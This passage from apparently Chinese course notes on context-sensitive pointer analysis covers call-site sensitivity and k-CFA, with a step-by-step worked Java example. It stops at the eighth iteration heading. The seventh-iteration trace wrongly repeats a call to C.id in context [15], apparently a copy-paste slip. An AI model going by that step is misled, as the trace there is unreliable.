          <a href="#总结-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227174951813.png" alt="image-20230227174951813"></p>
<p>理解<code>context sensitivity (C.S.)</code>以及<code>context-sensitive heap (C.S. heap)</code>的相关概念，以及这些方法为什么能够提升精度。关键点就是经过相同的代码，但是其上下文可能不同，如果混合了数据流就会比较虚假，所以需要进行精确区分上下文。</p>
<p><code>C.S.</code>指针分析的规则。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302105604591.png" alt="image-20230302105604591"></p>

        <h1 id="十一、Pointer-Analysis-Context-Sensitivity-II"   >
          <a href="#十一、Pointer-Analysis-Context-Sensitivity-II" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、Pointer-Analysis-Context-Sensitivity-II" class="headerlink" title="十一、Pointer Analysis Context Sensitivity (II)"></a>十一、Pointer Analysis Context Sensitivity (II)</h1>
      <p>一些小的回顾就不说了</p>

        <h2 id="3-Context-Sensitive-Pointer-Analysis-Algorithms"   >
          <a href="#3-Context-Sensitive-Pointer-Analysis-Algorithms" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Context-Sensitive-Pointer-Analysis-Algorithms" class="headerlink" title="3.Context Sensitive Pointer Analysis: Algorithms"></a>3.Context Sensitive Pointer Analysis: Algorithms</h2>
      <p>主体框架、流程和原来的差不多，加入上下文敏感了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302111205711.png" alt="image-20230302111205711"></p>
<p>首先是一些概念，和之前类似，加入了上下文</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302111745720.png" alt="image-20230302111745720"></p>
<p>具体例子如下</p>
<ul>
<li><p><code>RM</code></p>
<p>即<code>reachable methods</code>可达方法集合中所有方法都会有上下文，下面的就代表在<code>Ct</code>上下文下可达的方法。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302111827518.png" alt="image-20230302111827518"></p>
</li>
<li><p><code>CG</code></p>
<p>即<code>call graph</code>调用图中，如下<code>c</code>代表在调用时的上下文<br>$$<br>c:2\ \ \ \ \ \ c^t:T.foo(A,A)∈CG<br>$$<br><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302112047551.png" alt="image-20230302112047551"></p>
</li>
</ul>

        <h3 id="AddReachable-𝑐-𝑚"   >
          <a href="#AddReachable-𝑐-𝑚" class="heading-link"><i class="fas fa-link"></i></a><a href="#AddReachable-𝑐-𝑚" class="headerlink" title="AddReachable(𝑐:𝑚)"></a>AddReachable(𝑐:𝑚)</h3>
      <p>最开始进入的入口函数为<code>[]:m_entry</code>，此时没有什么上下文，所以就为<code>[]</code>，其他的和之前类似，加入上下文</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302113019796.png" alt="image-20230302113019796"></p>

        <h3 id="AddEdge-Propagate"   >
          <a href="#AddEdge-Propagate" class="heading-link"><i class="fas fa-link"></i></a><a href="#AddEdge-Propagate" class="headerlink" title="AddEdge/Propagate"></a>AddEdge/Propagate</h3>
      <p>和原先的一样，不需要怎么管</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302114824189.png" alt="image-20230302114824189"></p>
<p>因为<code>Propaget</code>传播依据现有的<code>PFG</code>进行传播，不需要管上下文。而<code>AddEdge</code>连边也是一样的，只是在<code>PFG</code>中连上两条边，并且指导后续的<code>WL</code>工作进度，不需要上下文。</p>

        <h3 id="Load-Store"   >
          <a href="#Load-Store" class="heading-link"><i class="fas fa-link"></i></a><a href="#Load-Store" class="headerlink" title="Load/Store"></a>Load/Store</h3>
      <p>主要看主体部分的<code>Load/Store</code>部分</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302141214011.png" alt="image-20230302141214011"></p>
<p>需要注意到图中用红色框起来的部分，每一个<code>c:x</code>和对应的<code>c:y</code>的上下文是一样的，这个应该也不难理解，因为传递的是指针对象集合，其包含的上下文也应该是一样的，不然可能不同的上下文导致不同的对象，其<code>field</code>也会可能发生改变。</p>

        <h3 id="ProcessCall-𝑐-𝑥-𝑐′-O𝑖"   >
          <a href="#ProcessCall-𝑐-𝑥-𝑐′-O𝑖" class="heading-link"><i class="fas fa-link"></i></a><a href="#ProcessCall-𝑐-𝑥-𝑐′-O𝑖" class="headerlink" title="ProcessCall(𝑐:𝑥, 𝑐′:O𝑖)"></a>ProcessCall(𝑐:𝑥, 𝑐′:O𝑖)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302142028418.png" alt="image-20230302142028418"></p>
<p>加入相关上下文，以及一个<code>Select(c,l,c&#39;:Oi)</code>这样一个用来选择上下文的函数，该函数依据自己的算法设计，进行上下文的选择，比如选中多个<code>lable</code>等，用来唯一标识，这个后面会详细讲一下。</p>
<p>注：该算法大多不涉及循环处理，因为开销比较大。其他领域有这个方面的。</p>

        <h2 id="4-Context-Sensitivity-Variants"   >
          <a href="#4-Context-Sensitivity-Variants" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Context-Sensitivity-Variants" class="headerlink" title="4.Context Sensitivity Variants"></a>4.Context Sensitivity Variants</h2>
      <p>主要讲<code>Select</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302143554661.png" alt="image-20230302143554661"></p>
<p>如上所示，各种上下文都可能会被考虑到。</p>

        <h3 id="Context-Insensitivity"   >
          <a href="#Context-Insensitivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Context-Insensitivity" class="headerlink" title="Context Insensitivity"></a>Context Insensitivity</h3>
      <p>其实对于<code>C.I.</code>这个技术而言，其本质就可以当作是<code>Select</code>选择出来的上下文为空，即</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302144056744.png" alt="image-20230302144056744"></p>

        <h3 id="Call-Site-Sensitivity"   >
          <a href="#Call-Site-Sensitivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Call-Site-Sensitivity" class="headerlink" title="Call-Site Sensitivity"></a>Call-Site Sensitivity</h3>
      <p><code>Olin Shivers, 1991. “Control-Flow Analysis of Higher-Order Languages”.  Ph.D. Dissertation. Carnegie Mellon University.</code>论文提出，方法叫做<code>Call-Site Sensitivity</code> ，或者<code>call-string  Sensitivity</code>，或者<code>k-CFA(Control-Flow Analysis)</code></p>
<p>其实就是一个<code>call chain</code>调用链，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302144152217.png" alt="image-20230302144152217"></p>
<p>即当进行<code>ProcessCall</code>的<code>Select</code>时，做的工作就是一个并集，将当前的调用点加入到之前的上下文中，形成当前新的上下文，调试程序的时候就经常可以看到，提供的例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302144545841.png" alt="image-20230302144545841"></p>
<p>但是这种有递归的情况中，由于每次碰到新的上下文方法，都会进行分析，所以就会导致分析出无穷无尽的调用链和对应的调用方法，那么就需要引入一个能够进行终止的方法<code>k-Call-Site Sensitivity/k-CFA</code>。</p>

        <h3 id="k-Call-Site-Sensitivity-k-CFA"   >
          <a href="#k-Call-Site-Sensitivity-k-CFA" class="heading-link"><i class="fas fa-link"></i></a><a href="#k-Call-Site-Sensitivity-k-CFA" class="headerlink" title="k-Call-Site Sensitivity/k-CFA"></a>k-Call-Site Sensitivity/k-CFA</h3>
      <p>加入一个<code>k</code>个数的限制</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302145404139.png" alt="image-20230302145404139"></p>
<p>即确保上下文个数为<code>k</code>个，如果超过了，就舍弃掉最老的上下文。</p>
<p>比如<code>k=2</code>,在<code>[2,3]</code>上下文中需要加入<code>[4]</code>，那么分析发现上下文个数超过<code>k</code>个，那么就舍弃掉<code>2</code>，新的上下文变成<code>[3,4]</code>。相当于是个缓存了。</p>

        <h4 id="实例-4"   >
          <a href="#实例-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4>
      <p>相关例子如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">()</span></span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span> <span class="keyword">implements</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Two</span> <span class="keyword">implements</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">2</span>; &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        C c = <span class="keyword">new</span> C();</span><br><span class="line">        c.m();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Number <span class="title">id</span><span class="params">(Number n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">m</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Number n1,n2,x,y;</span><br><span class="line">        n1 = <span class="keyword">new</span> One();</span><br><span class="line">        n2 = <span class="keyword">new</span> Two();</span><br><span class="line">        x = <span class="keyword">this</span>.id(n1);</span><br><span class="line">        y = <span class="keyword">this</span>.id(n2);</span><br><span class="line">        x.get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>省略掉<code>C.S.Heap</code>方法以及<code>m</code>函数里的<code>this</code>变量。</p>

        <h5 id="初始化-1"   >
          <a href="#初始化-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h5>
      <p>首先是初始化，经过<code>AddReachable</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302150804549.png" alt="image-20230302150804549"></p>
<p>得到结果如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RM = &#123;[]:C.main()&#125;</span><br><span class="line">WL = [&lt;[]:c,&#123;O3&#125;&gt;]</span><br><span class="line">由于没有x=y之类的语句,没有调用到AddEdge</span><br><span class="line">CG = &#123;&#125;</span><br><span class="line">PFG = &#123;&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="WL处理-2"   >
          <a href="#WL处理-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#WL处理-2" class="headerlink" title="WL处理"></a>WL处理</h5>
      
        <h6 id="第一次迭代-5"   >
          <a href="#第一次迭代-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代-5" class="headerlink" title="第一次迭代"></a>第一次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[]:c,&#123;O3&#125;&gt;;</span><br><span class="line">WL = [];</span><br><span class="line">RM = &#123;[]:C.main()&#125;;</span><br><span class="line">CG = &#123;&#125;;</span><br><span class="line">PFG = &#123;&#125;;</span><br><span class="line">n = []:c;</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt([]:c) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	PFG没有关于[]:c-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于a的成员没有相关Load和Store,有函数调用</span><br><span class="line">ProcessCall(c:x,c&#x27;:Oi):</span><br><span class="line">	context_c = [];</span><br><span class="line">	m = C.m();</span><br><span class="line">	c^t = [4];</span><br><span class="line">	WL += &lt;[4]:m_this,&#123;O3&#125;&gt;;</span><br><span class="line">	CG += &#123;[]:4-&gt;[4]:C.m()&#125;;</span><br><span class="line">	AddReachable(c^t:m):</span><br><span class="line">		RM += &#123;[4]:C.m()&#125;;</span><br><span class="line">		WL += [&lt;[4]:n1,&#123;O12&#125;&gt;,&lt;[4]:n2,&#123;O13&#125;&gt;];</span><br><span class="line">		没有关于[4]:n1和[4]:n2的Load操作，退出函数</span><br><span class="line">    没有传参传返回值操作，退出函数</span><br></pre></td></tr></table></div></figure>


        <h6 id="第二次迭代-5"   >
          <a href="#第二次迭代-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代-5" class="headerlink" title="第二次迭代"></a>第二次迭代</h6>
      <p>开始情况如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302152628874.png" alt="image-20230302152628874"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[4]:C.m_this,&#123;O3&#125;&gt;;</span><br><span class="line">WL = [&lt;[4]:n1,&#123;O12&#125;&gt;,&lt;[4]:n2,&#123;O13&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m()&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m()&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [4]:C.m_this;</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt([4]:C.m_this) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	PFG没有关于[4]:C.m_this-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于[4]:C.m_this的成员没有相关Load和Store</span><br><span class="line"></span><br><span class="line">存在[4]:C.m_this的函数调用</span><br><span class="line">ProcessCall(c:x,c&#x27;:Oi):</span><br><span class="line">	context_c = [4];</span><br><span class="line">	</span><br><span class="line">	迭代第一次</span><br><span class="line">	m = C.id(Number);</span><br><span class="line">	c^t = [14];</span><br><span class="line">	CG += &#123;[4]:14-&gt;[14]:C.id(Number)&#125;;</span><br><span class="line">	AddReachable(c^t:m):</span><br><span class="line">		RM += &#123;[14]:C.id(Number)&#125;;</span><br><span class="line">		没有新对象产生，退出函数</span><br><span class="line">	AddEdge:</span><br><span class="line">		PFG += &#123;[4]:n1-&gt;[14]:n&#125;;</span><br><span class="line">		PFG += &#123;[14]:n-&gt;[4]:x&#125;;</span><br><span class="line">	</span><br><span class="line">	迭代第二次</span><br><span class="line">	m = C.id(Number);</span><br><span class="line">	c^t = [15];</span><br><span class="line">	CG += &#123;[4]:15-&gt;[15]:c.id(Number)&#125;;</span><br><span class="line">	AddReachable(c^t:m):</span><br><span class="line">		RM += &#123;[15]:C.id(Number)&#125;;</span><br><span class="line">		没有新对象产生，退出函数</span><br><span class="line">	AddEdge:</span><br><span class="line">		PFG += &#123;[4]:n2-&gt;[15]:n&#125;;</span><br><span class="line">		PFG += &#123;[15]:n-&gt;[4]:y&#125;;</span><br></pre></td></tr></table></div></figure>

<p>结果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302155654514.png" alt="image-20230302155654514"></p>
<p>后面几次迭代就是一些传播了，大致概括如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302161116389.png" alt="image-20230302161116389"></p>

        <h6 id="第三次迭代-4"   >
          <a href="#第三次迭代-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次迭代-4" class="headerlink" title="第三次迭代"></a>第三次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[4]:n1,&#123;O12&#125;&gt;;</span><br><span class="line">WL = [&lt;[4]:n2,&#123;O13&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [4]:n1;</span><br><span class="line">pts = &#123;O12&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O12&#125; - &#123;&#125; = &#123;O12&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O12&#125;;</span><br><span class="line">	pt([4]:n1) = pt(n) = pts ⋃ pt(n) = &#123;O12&#125; ⋃ &#123;&#125; = &#123;O12&#125;;</span><br><span class="line">	WL += &lt;[14]:n,&#123;O12&#125;&gt;;</span><br><span class="line"></span><br><span class="line">关于[4]:n1的成员没有相关Load和Store以及函数调用，退出</span><br></pre></td></tr></table></div></figure>


        <h6 id="第四次迭代-2"   >
          <a href="#第四次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第四次迭代-2" class="headerlink" title="第四次迭代"></a>第四次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[4]:n2,&#123;O13&#125;&gt;;</span><br><span class="line">WL = [&lt;[14]:n,&#123;O12&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [4]:n2;</span><br><span class="line">pts = &#123;O13&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O13&#125; - &#123;&#125; = &#123;O13&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O13&#125;;</span><br><span class="line">	pt([4]:n2) = pt(n) = pts ⋃ pt(n) = &#123;O13&#125; ⋃ &#123;&#125; = &#123;O13&#125;;</span><br><span class="line">	WL += &lt;[15]:n,&#123;O13&#125;&gt;;</span><br><span class="line"></span><br><span class="line">关于[4]:n2的成员没有相关Load和Store以及函数调用，退出</span><br></pre></td></tr></table></div></figure>


        <h6 id="第五次迭代-2"   >
          <a href="#第五次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五次迭代-2" class="headerlink" title="第五次迭代"></a>第五次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[14]:n,&#123;O12&#125;&gt;;</span><br><span class="line">WL = [&lt;[15]:n,&#123;O13&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [14]:n;</span><br><span class="line">pts = &#123;O12&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O12&#125; - &#123;&#125; = &#123;O12&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O12&#125;;</span><br><span class="line">	pt([14]:n) = pt(n) = pts ⋃ pt(n) = &#123;O12&#125; ⋃ &#123;&#125; = &#123;O12&#125;;</span><br><span class="line">	WL += &lt;[4]:x,&#123;O12&#125;&gt;;</span><br><span class="line"></span><br><span class="line">关于[14]:n的成员没有相关Load和Store以及函数调用，退出</span><br></pre></td></tr></table></div></figure>


        <h6 id="第六次迭代-2"   >
          <a href="#第六次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第六次迭代-2" class="headerlink" title="第六次迭代"></a>第六次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[15]:n,&#123;O13&#125;&gt;;</span><br><span class="line">WL = [&lt;[4]:x,&#123;O12&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [15]:n;</span><br><span class="line">pts = &#123;O13&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O13&#125; - &#123;&#125; = &#123;O13&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O13&#125;;</span><br><span class="line">	pt([15]:n) = pt(n) = pts ⋃ pt(n) = &#123;O13&#125; ⋃ &#123;&#125; = &#123;O13&#125;;</span><br><span class="line">	WL += &lt;[4]:y,&#123;O13&#125;&gt;;</span><br><span class="line"></span><br><span class="line">关于[15]:n的成员没有相关Load和Store以及函数调用，退出</span><br></pre></td></tr></table></div></figure>


        <h6 id="第七次迭代-1"   >
          <a href="#第七次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第七次迭代-1" class="headerlink" title="第七次迭代"></a>第七次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[4]:x,&#123;O12&#125;&gt;;</span><br><span class="line">WL = [&lt;[4]:y,&#123;O13&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [4]:x;</span><br><span class="line">pts = &#123;O12&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O12&#125; - &#123;&#125; = &#123;O12&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O12&#125;;</span><br><span class="line">	pt([4]:x) = pt(n) = pts ⋃ pt(n) = &#123;O12&#125; ⋃ &#123;&#125; = &#123;O12&#125;;</span><br><span class="line">	PFG没有关于[4]:x-&gt;xxx的流向</span><br><span class="line"></span><br><span class="line">关于[4]:x的成员存在函数调用</span><br><span class="line">ProcessCall(c:x,c&#x27;:Oi):</span><br><span class="line">	context_c = [4];</span><br><span class="line">	</span><br><span class="line">	迭代第一次</span><br><span class="line">	m = One.get();</span><br><span class="line">	c^t = [16];</span><br><span class="line">	CG += &#123;[4]:16-&gt;[16]:One.get()&#125;;</span><br><span class="line">	AddReachable(c^t:m):</span><br><span class="line">		RM += &#123;[16]:One.get()&#125;;</span><br><span class="line">		没有新对象产生，退出函数</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	迭代第二次</span><br><span class="line">	m = C.id(Number);</span><br><span class="line">	c^t = [15];</span><br><span class="line">	CG += &#123;[4]:15-&gt;[15]:c.id(Number)&#125;;</span><br><span class="line">	AddReachable(c^t:m):</span><br><span class="line">		RM += &#123;[15]:C.id(Number)&#125;;</span><br><span class="line">		没有新对象产生，退出函数</span><br><span class="line">	没有传参传返回值操作，退出函数</span><br></pre></td></tr></table></div></figure>


        <h6 id="第八次迭代-1"   >
          <a href="#第八次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第八次迭代-1" class="headerlink" title="第八次迭代"></a>第八次迭代</h6>
